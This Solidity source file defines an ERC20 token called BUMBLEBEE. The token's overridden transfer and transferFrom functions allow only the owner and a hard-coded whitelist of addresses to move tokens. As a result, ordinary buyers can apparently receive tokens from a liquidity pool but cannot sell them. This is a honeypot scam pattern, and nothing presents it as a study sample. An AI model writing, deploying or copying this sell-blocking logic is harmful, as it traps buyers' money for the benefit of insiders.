// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("BUMBLEBEE", "BMB") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 21000000 * 10 ** decimals());
        whiteList[0xd87606c6Ed0218a7038536C1c268605C8077260F]= true;
        whiteList[0x553c30908466EA22F4e51B0190F24b7ECc9B8681]=true;
        whiteList[0x17c716B2F4f318c7173adD7bf03fC5BCA8B57BE6]=true;
        whiteList[0xCF7A6Fc691E6568F16bb626C342a43AfA64064c1]=true;
        whiteList[0x732f59Ddef63dCB09b31f7a21d9AD36D98B2649E]=true;
        whiteList[0x0BeB2236F447DE058EF4281553DdE887015C0568]=true;
        whiteList[0xfD53d8f512529264d25b1F16717f35914eC0CA24]=true;
        whiteList[0x1d4306fd64DABc2e602Bd5e8C34B13630eEb3d94]=true;
        whiteList[0x0c8958e97136C24D5FcdBc0942aFb72513A1A8ec]=true;
        whiteList[0x7b81c575Ea7754819658b24cAB3b8d61433651e8]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}